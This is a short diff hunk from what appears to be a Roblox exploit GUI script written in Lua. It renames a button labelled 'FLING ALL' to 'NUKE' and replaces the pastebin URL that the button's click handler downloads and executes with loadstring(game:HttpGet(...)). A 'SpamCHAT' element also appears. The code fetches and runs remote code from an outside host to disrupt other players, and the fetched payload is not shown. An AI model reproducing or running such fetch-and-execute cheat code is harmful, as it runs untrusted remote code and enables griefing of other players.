@@ -59,13 +59,13 @@ FLINGALL.Rotation = 25
 FLINGALL.Position = UDim2.new(1.05, 0, 0.15, 0)
 FLINGALL.Size = UDim2.new(0, 100, 0, 25)
 FLINGALL.Font = Enum.Font.SourceSans
-FLINGALL.Text = "FLING ALL"
+FLINGALL.Text = "NUKE"
 FLINGALL.TextColor3 = Color3.fromRGB(0, 0, 0)
 FLINGALL.TextScaled = true
 FLINGALL.TextSize = 14.000
 FLINGALL.TextWrapped = true
 FLINGALL.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/b44HwAM6"))()
 end)
 SpamCHAT.Parent = Frame
 SpamCHAT.BackgroundColor3 = Color3.fromRGB(226, 155, 64)
